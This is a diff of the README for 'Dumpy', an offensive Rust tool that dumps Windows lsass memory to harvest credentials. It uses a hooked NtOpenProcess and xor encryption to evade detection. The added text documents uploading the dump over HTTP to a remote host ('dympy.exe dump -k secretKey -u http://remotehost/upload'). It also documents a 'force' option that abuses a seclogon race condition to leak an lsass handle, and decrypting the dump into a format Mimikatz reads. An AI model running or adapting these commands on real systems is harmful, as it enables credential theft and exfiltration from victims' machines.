@@ -4,42 +4,49 @@ This tool dynamically calls MiniDumpWriteDump to dump lsass memory content. This
 
 NtOpenProcess is hooked before calling MiniDumpWriteDump to avoid the opening of a new process handle over lsass.
 
-NTFS Transaction are used in order to xor the memory dump before storing it on disk.
+NTFS Transaction are used in order to xor the memory dump before storing it on disk or sending it throught HTTP.
 
-Support added for both x86 and x64.
+**Support added for both x86 and x64**.
 
 # Compilation 
 
 Since we are using [LITCRYPT](https://github.com/anvie/litcrypt.rs) plugin to obfuscate string literals, it is required to set up the environment variable LITCRYPT_ENCRYPT_KEY before compiling the code:
 
-	set LITCRYPT_ENCRYPT_KEY="yoursupersecretkey"
+	C:\Users\User\Desktop\Dumpy\dumpy> set LITCRYPT_ENCRYPT_KEY="yoursupersecretkey"
 
 After that, simply compile the code and execute it:
 
-	cargo build
-	dumpy.exe -h
+	C:\Users\User\Desktop\Dumpy\dumpy> cargo build --release
+	C:\Users\User\Desktop\Dumpy\dumpy\target\x86_64-pc-windows-msvc\release> dumpy.exe -h
+
+In case that you want to compile the tool for a x86 system, modify the value of the option "target" in the file .cargo\config (e.g: target = "i686-pc-windows-msvc").
 
 # Usage
 
 	USAGE:
-    dumpy.exe [OPTIONS] <ACTION>
+    dumpy.exe [OPTIONS] <ACTION> [FORCE]
 
 	ARGS:
-	    <ACTION>    dump or decrypt
+	    <ACTION>    Valid values: dump or decrypt
+	    <FORCE>     Force seclogon's service to leak a lsass handle through a race condition
 
 	OPTIONS:
 	    -h, --help                         Print help information
-	    -i, --input-file <INPUT_FILE>      Encrypted input file [default: c:\temp\input.txt]
+	    -i, --input-file <INPUT_FILE>      Encrypted dump file [default: c:\temp\input.txt]
 	    -k, --key <KEY>                    Encryption key [default: 1234abcd]
 	    -o, --output-file <OUTPUT_FILE>    Destination path [default: c:\temp\output.txt]
-	    -u, --upload <UPLOAD>              URL where the dump should be uploaded [default:
-	                                       http://remotehost/upload]
+	    -u, --upload <UPLOAD>              Upload URL
+
 Dumpy has two main actions:
 
 - **dump**: It will execute the main logic to dump the lsass content. By default, it will store the result in a xored text file with a random name in the current directory. The option **upload** allows to send the memory content over HTTP to a remote host, avoiding the creation of the xored file on disk. I've used [this simple HTTP server](https://gist.github.com/smidgedy/1986e52bb33af829383eb858cb38775c) in order to handle the upload, but any other HTTP server that supports **multipart/form-data requests** will work.
 
-		dympy.exe dump -k secretKey -u http://remotehost/upload
+		C:\Temp> dympy.exe dump -k secretKey -u http://remotehost/upload
 
-- **decrypt**: This action allows to obtain the decrypted memory dump in the same format that tools like Mimikatz would expect. As arguments it expects the xored memory dump, the encryption key and the output file path. In case the xored file has been uploaded using HTTP, **it is required to perform a base64 decoding before this decryption process**.
+If you want to force the leakage of a handle to the lsass through the race condition in seclogon's service described by [Antonio Cocomazzi](https://twitter.com/splinter_code) in [this post](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html), just use the option **force**:
+		
+		C:\Temp> dympy.exe dump -k secretKey -u http://remotehost/upload force
 
-		dumpy.exe decrypt -i xored.txt -o decrypted.txt -k secretKey
+- **decrypt**: This action allows to obtain the decrypted memory dump in the same format that tools like Mimikatz would expect. As arguments it expects the xored memory dump, the encryption key and the output file path. In case the xored file has been uploaded using HTTP, **it is required to perform a base64 decoding of the content before this decryption process**.
+
+		C:\Temp> dumpy.exe decrypt -i xored.txt -o decrypted.txt -k secretKey
